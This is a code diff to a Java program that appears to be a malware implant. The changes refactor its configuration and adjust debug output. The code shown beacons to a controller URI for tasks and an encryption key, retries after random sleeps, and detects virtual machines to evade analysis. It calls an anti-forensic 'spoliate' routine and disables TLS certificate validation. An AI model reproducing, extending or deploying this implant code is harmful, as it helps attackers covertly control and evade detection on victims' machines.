@@ -97,6 +97,7 @@ public class Main
     static private countermeasures cm = new countermeasures();
     static private utilitarian nUtil = new utilitarian();
     static private pkgLib packager = new pkgLib();
+    static private nConfig config = new nConfig();
 
     public static void main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
@@ -112,12 +113,10 @@ public class Main
             cm.spoliate();
         }
 
-        System.out.println("waiting");
         //execute initial 
         //start loop
         //if no authentication has occurred before, the keepalive will find autolib and a task object for metadata and to start the metastasizer
         //TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
-        System.out.println("wait is over");
         keepalive();
     }
 
@@ -130,6 +129,8 @@ public class Main
 
         int c;
 
+        System.out.println(config.encKey);
+        System.out.println(nonce);
         for (c=0; c<4; c++)
         {
             try
@@ -139,11 +140,10 @@ public class Main
                 if (cReq != "null")
                 {
                     Hashtable xmlResponse = nUtil.xmlStringToParseable(cReq);  
-                    System.out.println(xmlResponse.toString());  
 
                     nonce = xmlResponse.get("nonce").toString();
                     cookieData = xmlResponse.get("cookie").toString();
-                    cookieData = xmlResponse.get("key").toString();
+                    config.encKey = xmlResponse.get("key").toString();
 
                     ArrayList taskSet = (ArrayList) xmlResponse.get("tasks");
 
@@ -151,18 +151,17 @@ public class Main
                     {
                         tasks.add(taskSet.get(k));
                     }
-
-                    System.out.println(tasks.toString());
                     break;
                 }
                 else
                 {
+                    TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(4,10))*1000);
                     continue;
                 }
             }
             catch (Exception e)
             {
-                System.out.println(e.getMessage());
+                TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(4,10))*1000);
                 continue;
             }
         }
@@ -239,7 +238,6 @@ public class Main
     public static void send() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
         network nComm = new network();
-        System.out.println(output.size());
         if (output.size() > 0)
         {
             System.out.println("output available");
@@ -252,7 +250,6 @@ public class Main
                 }
                 catch (Exception e)
                 {
-                    System.out.println(e.getMessage());
                     continue;
                 }
             }
@@ -468,7 +465,7 @@ public class Main
             utilitarian nUtil = new utilitarian();
             security nSec = new security();
 
-            authData.put("aKey",nConfig.passMat);
+            authData.put("aKey",config.passMat);
 
             return nUtil.xmlDocToString(nUtil.outputToXmlDoc("init",authData));
 
@@ -483,7 +480,8 @@ public class Main
             SSLContext sslCon = SSLContext.getInstance("TLS");
             sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
             
-            String fmtUri = String.format("%s/%s",nConfig.uri,nConfig.endpoints.get(endpointType).toString());
+            String fmtUri = String.format("%s/%s",config.uri,config.endpoints.get(endpointType).toString());
+            System.out.println(fmtUri);
 
             URL ctrlUrl = new URI(fmtUri).toURL();
 
@@ -523,15 +521,19 @@ public class Main
                     )
                 );
 
+                System.out.println(postBlob);
+
                 connOutWriter.write(
                     postBlob
                 );
 
                 connOutWriter.flush();
 
+                System.out.println(connMan.getResponseCode());
+
                 if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
                 {
-
+                    
                     BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
                     String responseData = connInReader.readLine();
                     connOutWriter.close();
@@ -621,7 +623,7 @@ public class Main
                 score += 3;
             }
 
-            if (score <= nConfig.virtThreshold)
+            if (score <= config.virtThreshold)
             {
                 return false;
             }
@@ -668,7 +670,7 @@ public class Main
 
         private SecretKey initKey() throws Exception
         {
-            byte[] keyBytes = nConfig.encKey.getBytes();
+            byte[] keyBytes = config.encKey.getBytes();
             SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
             return key;
         }
